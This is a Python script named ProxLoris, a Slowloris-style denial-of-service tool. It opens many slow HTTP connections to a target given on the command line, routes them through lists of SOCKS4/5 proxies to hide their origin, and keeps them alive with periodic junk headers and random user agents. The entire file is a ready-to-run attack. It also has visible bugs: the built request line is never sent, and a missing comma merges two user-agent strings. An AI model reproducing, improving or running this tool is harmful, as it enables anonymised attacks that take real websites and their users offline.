#ProxLoris.py v2 - originally by rayZor_, project upgraded by infodox.
# Now using random user agents! More random junk data in GET requests!
# Code being cleaned!
import sys
import threading
import socket
import socks
import os
import time
import random


useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13"
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]

#---------------------------------{ global }-------------------------------#
siteHost = ''
sitePort = 80
pInstance = 30 #use single proxy how many times?
userAgent = random.choice(useragents)
#--------------------------------------------------------------------------#

s5list = []
s4list = []

succeed = 0

def notice(msg):
    print '[+] ' + msg
    
def error(msg):
	print '[-] ' + msg
        
    

class Response(object):
    def __init__(self):
        self.chunks = []
    def callback(self, chunk):
        self.chunks.append(chunk)
    def content(self):
        return ''.join(self.chunks)

class http_drone:

    def __init__(self, paddress, ptype):
        self.paddress = paddress
        self.ptype = ptype
        self.sck = socket
        self.spawn_drone()

    def close(self):
        self.sckt.close()
    
    def conn(self):
        
        try:
            self.sckt.connect((siteHost, sitePort))
        except:
            return

        x = random.randint(10000, 100000)

        payload = 'GET /' + str(x) + ' HTTP/1.1\r\nHost: ' + siteHost + '\r\n' + 'User-Agent: ' + userAgent + '\r\n' + 'Content-Length: 36\r\n'
        fs = self.sckt.makefile()

        while 1:
            time.sleep(2.7)

#            f = fs.readline()
#            f = f.strip()

            self.send('X-FuckOff: Connection Close\r\n')


    def send(self, msg):
        try:
            self.sckt.send(msg)
        except:
            return

    def spawn_drone(self):
        s = socks.socksocket()
        p = self.paddress.rsplit(':', 2)

        if len(p) != 2:
            error('Invalid proxy!')
            return

        if self.ptype == 's5':
            s.setproxy(socks.PROXY_TYPE_SOCKS5, p[0], int(p[1]))
        elif self.ptype == 's4':
            s.setproxy(socks.PROXY_TYPE_SOCKS4, p[0], int(p[1]))
        else:
            error('Invalid proxy!')
            return
        
        self.sckt = s
        
        threading.Thread(target=self.conn, args=()).start()

def fork_drones():
    notice('Forking Socks5...')
   
    for i in range(0, len(s5list)):
        s5 = http_drone(s5list[i], 's5') 
        #threading.Thread(target=hit_site, args=(s5list[i], 's5')).start()
        time.sleep(0.05)
    
    notice('Forking Socks4...')
   
    for i in range(0, len(s4list)):
        s4 = http_drone(s4list[i], 's4')   
        #threading.Thread(target=hit_site, args=(s4list[i], 's4')).start()
        time.sleep(0.05)

def load_proxies():
    if os.path.isfile('./socks5.txt'):
        for f in open('./socks5.txt', 'r'):
            s5list.append(f)
        
    if os.path.isfile('./socks4.txt'):
        for f in open('./socks4.txt', 'r'):
             s4list.append(f)  
    
    num_proxies = (len(s4list) + len(s5list))
    notice('Loaded ' + str(num_proxies) + ' proxies.')

print "ProxLoris"

gtg = 1

if(len(sys.argv) == 2):
    siteHost = sys.argv[1]
elif(len(sys.argv) == 3):
    siteHost = sys.argv[1]
    pInstance = int(sys.argv[2])
elif(len(sys.argv) == 4):
    siteHost = sys.argv[1]
    pInstance = int(sys.argv[2])
    sitePort = int(sys.argv[3])
else:
    error("Needs Arguements")
    print("Usage: <Target> <ProxyReuse> <port> ")
    print("Port defaults to 80")
    gtg = 0

if gtg > 0:
    load_proxies()

    for i in range(0, pInstance):
        fork_drones()
